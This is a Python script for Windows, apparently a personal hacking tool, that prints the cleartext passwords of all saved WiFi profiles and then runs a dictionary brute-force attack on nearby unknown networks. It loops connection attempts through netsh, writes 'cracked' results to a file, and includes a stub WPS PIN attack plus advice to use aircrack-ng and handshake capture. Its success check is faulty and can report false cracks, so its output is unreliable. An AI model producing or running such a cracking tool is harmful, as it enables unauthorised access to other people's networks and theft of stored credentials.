import subprocess
import re
import os
import time
import ctypes

def is_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main_menu():
    """Main menu for WiFi password tools"""
    print("\n" + "="*60)
    print("WiFi Password Recovery Tool")
    print("="*60)
    print("1. Show ALL saved WiFi passwords")
    print("2. Brute-force UNKNOWN WiFi networks")
    print("3. Exit")
    print("="*60)
    
    choice = input("Select option (1-3): ").strip()
    
    if choice == "1":
        show_all_wifi_passwords()
    elif choice == "2":
        brute_force_unknown_networks()
    elif choice == "3":
        print("Exiting...")
        return
    else:
        print("Invalid choice!")
        main_menu()

def show_all_wifi_passwords():
    """Display passwords for all saved WiFi networks"""
    print("\n" + "="*60)
    print("WiFi Passwords for All Saved Networks")
    print("="*60)
    
    # Get saved profiles
    saved_profiles = get_saved_profiles()
    
    if not saved_profiles:
        print("No saved WiFi profiles found.")
        return
    
    # Get password for each profile
    found_passwords = 0
    for profile in saved_profiles:
        password = get_password_for_profile(profile)
        if password:
            print(f"\nNetwork: {profile}")
            print(f"Password: {password}")
            found_passwords += 1
        else:
            print(f"\nNetwork: {profile}")
            print(f"Password: (no password saved or hidden)")

    print("\n" + "="*60)
    print(f"Total networks with passwords: {found_passwords}/{len(saved_profiles)}")
    print("="*60)
    print("\nNOTE: To find passwords for UNKNOWN networks NOT saved:")
    print("1. Run this script as Administrator")
    print("2. Enable Location Services (Settings > Privacy & security > Location)")
    print("3. Use network scanning: netsh wlan show networks mode=Bssid")
    print("4. For networks you cannot access:")
    print("   - Try common passwords (brute force)")
    print("   - Use WiFi cracking tools (aircrack-ng, Hashcat)")
    print("   - Capture handshake and perform dictionary attack")
    print("   - Check for WPS vulnerabilities")

def get_saved_profiles():
    """Get list of saved WiFi profiles"""
    cmd = 'netsh wlan show profiles'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    profiles = []
    
    if result.returncode == 0:
        for line in result.stdout.splitlines():
            if "All User Profile" in line:
                parts = line.split(":")
                if len(parts) > 1:
                    profile_name = parts[1].strip()
                    if profile_name and profile_name != "<None>":
                        profiles.append(profile_name)
    
    return profiles

def get_password_for_profile(profile_name):
    """Get password for a specific WiFi profile"""
    cmd = f'netsh wlan show profiles name="{profile_name}" key=clear'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    
    if result.returncode == 0:
        for line in result.stdout.splitlines():
            if "Key Content" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    password = parts[1].strip()
                    if password:
                        return password
    
    return None

def brute_force_unknown_networks():
    """Attempt to find and crack unknown WiFi networks"""
    print("\n" + "="*60)
    print("Brute Force Attack on Unknown WiFi Networks")
    print("="*60)
    
    # Check for admin privileges
    if not is_admin():
        print("\n[ERROR] This script requires Administrator privileges!")
        print("\nTo run as Administrator:")
        print("1. Press Windows Key + X")
        print("2. Select 'Windows Terminal (Admin)' or 'Command Prompt (Admin)'")
        print("3. Run: cd d:\\Hacking && python first.py")
        print("\nAlternatively:")
        print("1. Right-click on Command Prompt")
        print("2. Select 'Run as administrator'")
        print("3. Run: cd d:\\Hacking && python first.py\n")
        return
    
    print("[✓] Running with Administrator privileges")
    print("[*] This script requires Location Services enabled in Windows Settings\n")
    
    # Get saved profiles to exclude them
    saved_profiles = get_saved_profiles()
    saved_ssids_lower = [p.lower() for p in saved_profiles]
    
    print(f"[*] Saved profiles: {len(saved_profiles)}")
    
    # Try to get available networks (requires admin + location services)
    available_networks = get_available_networks()
    
    if not available_networks:
        print("\n[!] Could not retrieve available networks.")
        print("    - Run as Administrator")
        print("    - Enable Location Services in Windows Settings")
        print("    - Try manual entry instead\n")
        
        # Manual entry option
        manual = input("Enter WiFi SSID to brute-force (or press Enter to skip): ").strip()
        if manual:
            available_networks = [manual]
        else:
            return
    
    # Filter for unknown networks
    unknown_networks = [net for net in available_networks if net.lower() not in saved_ssids_lower]
    
    if not unknown_networks:
        print("\n[*] No unknown networks found. All available networks are saved.")
        return
    
    print(f"\nUnknown networks found: {len(unknown_networks)}")
    for net in unknown_networks:
        print(f"  - {net}")
    
    # Try to crack each unknown network
    print("\n" + "-"*60)
    print("Starting brute-force attack...")
    print("-"*60 + "\n")
    
    cracked_networks = []
    
    for network in unknown_networks:
        print(f"[*] Attempting to crack: {network}")
        password = try_common_passwords(network)
        
        if password:
            print(f"[+] SUCCESS! Password found: {password}\n")
            cracked_networks.append((network, password))
        else:
            print(f"[-] Failed to crack with common passwords\n")
    
    # Display results summary
    print("\n" + "="*60)
    print("CRACKING RESULTS")
    print("="*60)
    
    if cracked_networks:
        print(f"\n[+] Successfully cracked {len(cracked_networks)} network(s):\n")
        for ssid, pwd in cracked_networks:
            print(f"    SSID: {ssid}")
            print(f"    Password: {pwd}\n")
        
        # Save results to file
        try:
            with open("cracked_wifi.txt", "w") as f:
                f.write("CRACKED WiFi NETWORKS\n")
                f.write("=" * 60 + "\n\n")
                for ssid, pwd in cracked_networks:
                    f.write(f"SSID: {ssid}\n")
                    f.write(f"Password: {pwd}\n\n")
            print("[*] Results saved to cracked_wifi.txt")
        except:
            pass
    else:
        print(f"\n[-] No networks cracked. All networks use strong passwords.")
    
    print("\n" + "="*60)

def get_available_networks():
    """Get list of available WiFi networks currently broadcasting"""
    cmd = 'netsh wlan show networks mode=Bssid'
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    networks = []
    
    if result.returncode != 0:
        return networks
    
    for line in result.stdout.splitlines():
        # Look for SSID lines (format: "  SSID 1 : NetworkName")
        if "SSID" in line and ":" in line:
            parts = line.split(":")
            if len(parts) >= 2:
                network_name = parts[1].strip()
                # Filter out headers and empty names
                if network_name and network_name != "" and "All" not in line:
                    if network_name not in networks:
                        networks.append(network_name)
    
    return networks

def try_common_passwords(ssid):
    """Try common passwords for an unknown network"""
    
    # Generate comprehensive password list
    passwords = generate_password_list(ssid)
    
    print(f"    Trying {len(passwords)} passwords...")
    
    for i, pwd in enumerate(passwords):
        if (i + 1) % 20 == 0:
            print(f"    Progress: {i + 1}/{len(passwords)}", end='\r')
        
        if attempt_connect(ssid, pwd):
            print(f"    Progress: {len(passwords)}/{len(passwords)} - CRACKED!      ")
            return pwd
        
        time.sleep(0.02)
    
    print(f"    Progress: {len(passwords)}/{len(passwords)} - Failed         ")
    
    # Try WPS PIN attack
    print(f"    Attempting WPS PIN attack...")
    wps_result = try_wps_attack(ssid)
    if wps_result:
        return wps_result
    
    return None

def generate_password_list(ssid):
    """Generate an extensive password list with variations"""
    passwords = set()
    
    # Base passwords - common defaults
    base_passwords = [
        # Router defaults
        "admin", "password", "12345678", "123456", "1234567890",
        "admin123", "password123", "root", "test", "guest",
        
        # Numeric sequences
        "123456789", "88888888", "00000000", "11111111", "99999999",
        "666666", "777777", "888888", "123123", "234567",
        "345678", "456789", "567890", "1111", "2222", "3333", "4444",
        "5555", "6666", "7777", "8888", "9999", "0000",
        
        # Common words
        "welcome", "letmein", "qwerty", "monkey", "dragon", "master",
        "sunshine", "shadow", "freedom", "hello", "superman", "batman",
        "login", "pass", "secret", "love", "money", "god",
        
        # Router/Network
        "Router123", "WiFi123", "Network123", "Wireless123", "Internet123",
        "wifi", "wireless", "router", "modem", "broadband",
        
        # Patterns
        "qwertyuiop", "asdfghjkl", "zxcvbnm", "abcdefgh",
        "abcd1234", "1a2b3c4d", "aaaaaaaa", "bbbbbbbb",
        "aaaaaa", "111111", "222222", "333333", "444444", "555555",
        
        # Company/Organization
        "company", "office", "work", "business", "corporate",
        "university", "school", "college", "education", "student",
        "admin@123", "root@123",
        
        # Variations
        "123@123", "admin@admin", "test123", "demo123", "user123",
        "guest123", "guestguest", "adminadmin", "Qwerty123", "Password@1",
        
        # Years
        "2023", "2024", "2025", "2021", "2020", "2022",
        
        # Special patterns
        "!@#$%^", "123456!", "password!", "admin!", "test@123",
    ]
    
    # Add base passwords
    for pwd in base_passwords:
        passwords.add(pwd)
    
    # Generate SSID-based passwords
    ssid_passwords = generate_ssid_passwords(ssid)
    passwords.update(ssid_passwords)
    
    # Generate hybrid passwords (word + number combinations)
    hybrid_passwords = generate_hybrid_passwords()
    passwords.update(hybrid_passwords)
    
    # Add more specific variations
    variations = generate_variations()
    passwords.update(variations)
    
    # Load from wordlist if exists
    wordlist_passwords = load_wordlist()
    passwords.update(wordlist_passwords)
    
    # Empty password
    passwords.add("")
    
    return list(passwords)

def generate_ssid_passwords(ssid):
    """Generate passwords based on SSID name"""
    passwords = set()
    
    # Use SSID as password and variations
    passwords.add(ssid)
    passwords.add(ssid.lower())
    passwords.add(ssid.upper())
    passwords.add(ssid + "123")
    passwords.add(ssid + "@123")
    passwords.add(ssid + "2023")
    passwords.add(ssid + "2024")
    
    # Try without numbers/special chars
    clean_ssid = "".join(c for c in ssid if c.isalnum())
    if clean_ssid and clean_ssid != ssid:
        passwords.add(clean_ssid)
        passwords.add(clean_ssid.lower())
        passwords.add(clean_ssid + "123")
    
    # Try first word from SSID
    parts = ssid.split("_")
    if len(parts) > 1:
        first_part = parts[0]
        passwords.add(first_part)
        passwords.add(first_part.lower())
        passwords.add(first_part + "123")
        passwords.add(first_part + "@123")
    
    return passwords

def generate_hybrid_passwords():
    """Generate hybrid word + number combinations"""
    passwords = set()
    
    words = ["admin", "router", "wifi", "network", "password", "access",
             "welcome", "guest", "test", "default", "system", "root",
             "user", "tech", "security", "connect"]
    
    numbers = ["", "1", "12", "123", "1234", "12345", "123456", "2023", "2024"]
    specials = ["", "@", "!", "#", "$", "%", "-", "_"]
    
    for word in words:
        for num in numbers:
            for spec in specials:
                if num or spec:
                    passwords.add(f"{word}{spec}{num}")
                    passwords.add(f"{word}{num}{spec}")
                    passwords.add(word)
    
    return passwords

def generate_variations():
    """Generate additional password variations"""
    passwords = set()
    
    # Common variations
    variations = [
        "admin123!", "admin@2023", "admin@2024",
        "password@123", "pass@123", "passwd123",
        "wifi@home", "home@wifi", "home123",
        "office123", "work123", "workplace",
        "india123", "server123", "local123",
        "secure123", "secure@123", "safe123",
        "access123", "access@123", "door123",
        "enter123", "hello123", "start123",
        "begin123", "open123", "unlock123"
    ]
    
    for pwd in variations:
        passwords.add(pwd)
        passwords.add(pwd.upper())
        passwords.add(pwd.lower())
    
    return passwords

def load_wordlist():
    """Load passwords from wordlist file if it exists"""
    passwords = set()
    
    wordlist_files = [
        "wordlist.txt", "passwords.txt", "dict.txt",
        "wifi_passwords.txt", "common_passwords.txt"
    ]
    
    for filename in wordlist_files:
        try:
            if os.path.exists(filename):
                print(f"    Loading passwords from {filename}...")
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        pwd = line.strip()
                        if pwd:
                            passwords.add(pwd)
                print(f"    Loaded {len(passwords)} passwords from file")
                break
        except:
            pass
    
    return passwords

def attempt_connect(ssid, password):
    """Attempt to connect to a WiFi network with given password"""
    try:
        # Create network profile XML
        profile_xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>CCMP</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
    <connectionMode>auto</connectionMode>
</WLANProfile>"""
        
        # Create temporary filename
        safe_ssid = "".join(c if c.isalnum() else "_" for c in ssid)
        filename = f"temp_profile_{safe_ssid}.xml"
        
        try:
            # Write profile to file
            with open(filename, "w", encoding="utf-8") as f:
                f.write(profile_xml)
            
            # Try to add the profile
            cmd = f'netsh wlan add profile filename="{filename}" interface="Wi-Fi"'
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode != 0:
                # Profile addition failed - might be wrong password or network offline
                return False
            
            # If profile added successfully, try to connect
            # Try to connect
            connect_cmd = f'netsh wlan connect name="{ssid}" interface="Wi-Fi"'
            connect_result = subprocess.run(connect_cmd, capture_output=True, text=True, shell=True)
            
            time.sleep(0.5)  # Wait for connection attempt
            
            # Check connection status
            status_cmd = f'netsh wlan show interfaces'
            status_result = subprocess.run(status_cmd, capture_output=True, text=True, shell=True)
            
            # Try to remove profile
            remove_cmd = f'netsh wlan delete profile name="{ssid}" interface="Wi-Fi"'
            subprocess.run(remove_cmd, capture_output=True, text=True, shell=True)
            
            # Check if connection was successful
            if "connected" in status_result.stdout.lower() and ssid.lower() in status_result.stdout.lower():
                return True
            
            # Also check if there's no authentication error on disconnect
            if "cannot find" not in connect_result.stderr.lower():
                if result.returncode == 0 and connect_result.returncode == 0:
                    return True
                    
        except Exception as e:
            pass
        finally:
            # Clean up XML file
            try:
                if os.path.exists(filename):
                    os.remove(filename)
            except:
                pass
    except:
        pass
    
    return False

def try_wps_attack(ssid):
    """Try to crack WiFi using WPS PIN attack"""
    try:
        # Common WPS PINs to try
        wps_pins = [
            "12345670", "00000000", "11111111", "12121212",
            "44556677", "88888888", "99999999", "12341234",
            "10000000", "20000000"
        ]
        
        print(f"    Trying {len(wps_pins)} WPS PINs...")
        
        for pin in wps_pins:
            # WPS connection attempt (Windows doesn't have built-in WPS cracking, so this is simulated)
            # In real scenarios, you'd use wpa_supplicant or other Linux tools
            if test_wps_pin(ssid, pin):
                return f"WPS-PIN:{pin}"
        
        return None
    except:
        return None

def test_wps_pin(ssid, pin):
    """Test a WPS PIN (limited functionality on Windows)"""
    # Windows doesn't have native WPS cracking, but we can attempt through netsh
    # This is a placeholder for more advanced implementations
    try:
        cmd = f'netsh wlan show networks'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        # Simplified check - would need additional tools for real WPS cracking
        return False
    except:
        return False

# Main execution
if __name__ == "__main__":
    main_menu()
